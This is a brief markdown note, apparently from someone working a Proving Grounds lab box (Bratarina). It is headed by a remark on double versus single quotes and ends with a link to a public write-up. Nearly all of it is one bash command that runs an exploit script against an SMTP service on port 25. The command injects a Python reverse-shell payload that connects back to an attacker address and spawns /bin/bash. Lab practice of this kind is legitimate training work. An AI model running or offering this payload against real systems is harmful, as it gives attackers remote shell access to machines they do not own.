### "  vs '
```bash
python3 47984.py 192.168.91.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.91\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```

### writeup
https://dylanrholloway.com/proving-grounds-bratarina-write-up/
